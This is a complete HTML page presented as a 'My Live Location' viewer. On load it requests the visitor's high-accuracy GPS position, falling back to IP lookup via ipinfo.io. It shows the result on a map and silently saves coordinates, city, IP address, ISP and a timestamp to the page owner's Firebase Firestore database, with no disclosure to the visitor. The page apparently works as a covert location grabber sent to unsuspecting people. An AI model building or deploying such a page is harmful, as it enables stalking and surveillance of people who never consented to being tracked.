<!DOCTYPE html>
<html>
<head>

<title>Live Location Tracker</title>

<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>

<style>

body{
font-family:Arial;
background:#f4f6fb;
margin:0;
}

header{
background:#ff4b5c;
color:white;
padding:15px;
font-size:22px;
text-align:center;
}

.container{
width:90%;
margin:auto;
margin-top:20px;
display:flex;
gap:20px;
}

.info{
width:45%;
background:white;
padding:20px;
border-radius:8px;
box-shadow:0 2px 6px rgba(0,0,0,0.1);
}

.row{
margin-bottom:12px;
border-bottom:1px solid #eee;
padding-bottom:6px;
}

.label{
color:#ff4b5c;
font-weight:bold;
}

#map{
width:55%;
height:400px;
border-radius:8px;
}

#status{
margin-top:10px;
font-size:18px;
text-align:center;
}

</style>

</head>

<body>

<header>
📍 My Live Location
</header>

<div id="status">Please Wait...</div>

<div class="container">

<div class="info">

<div class="row"><span class="label">Latitude:</span> <span id="lat">...</span></div>
<div class="row"><span class="label">Longitude:</span> <span id="lon">...</span></div>
<div class="row"><span class="label">City:</span> <span id="city">...</span></div>
<div class="row"><span class="label">IP:</span> <span id="ip">...</span></div>
<div class="row"><span class="label">ISP:</span> <span id="isp">...</span></div>
<div class="row"><span class="label">Type:</span> <span id="type">...</span></div>

</div>

<div id="map"></div>

</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain: "location-tracker-bba55.firebaseapp.com",
projectId: "location-tracker-bba55",
storageBucket: "location-tracker-bba55.appspot.com",
messagingSenderId: "951484366467",
appId: "1:951484366467:web:2e936d42b1704027f665b6"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

var map = L.map('map').setView([23.8103,90.4125],10);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
maxZoom:19
}).addTo(map);

async function getCityFromLatLon(lat, lon){

try{
const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
const data = await res.json()

return data.address.city || data.address.town || data.address.village || "unknown"

}catch{
return "unknown"
}

}

async function getIPData(){

try{
const res = await fetch("https://ipinfo.io/json")
return await res.json()
}catch{
return {}
}

}

async function saveAll(lat, lon, city, ip, isp, type){

await addDoc(collection(db,"locations"),{
latitude: lat,
longitude: lon,
city: city,
ip: ip,
isp: isp,
type: type,
time: new Date().toLocaleString()
})

}

async function useGPS(position){

let lat = position.coords.latitude
let lon = position.coords.longitude

let city = await getCityFromLatLon(lat, lon)
let ipData = await getIPData()

document.getElementById("lat").innerText = lat
document.getElementById("lon").innerText = lon
document.getElementById("city").innerText = city
document.getElementById("ip").innerText = ipData.ip || "unknown"
document.getElementById("isp").innerText = ipData.org || "unknown"
document.getElementById("type").innerText = "GPS"

map.setView([lat,lon],15)
L.marker([lat,lon]).addTo(map)

saveAll(lat, lon, city, ipData.ip, ipData.org, "GPS")

}

async function useIP(){

let data = await getIPData()

document.getElementById("status").innerHTML = "⚠️ Using IP location"

document.getElementById("city").innerText = data.city || "unknown"
document.getElementById("ip").innerText = data.ip || "unknown"
document.getElementById("isp").innerText = data.org || "unknown"
document.getElementById("type").innerText = "IP"

if(data.loc){
let [lat,lon] = data.loc.split(",")

document.getElementById("lat").innerText = lat
document.getElementById("lon").innerText = lon

map.setView([lat,lon],10)
L.marker([lat,lon]).addTo(map)

saveAll(lat, lon, data.city, data.ip, data.org, "IP")
}

}

navigator.geolocation.getCurrentPosition(
useGPS,
useIP,
{
enableHighAccuracy:true,
timeout:10000
}
)

</script>

</body>
</html>
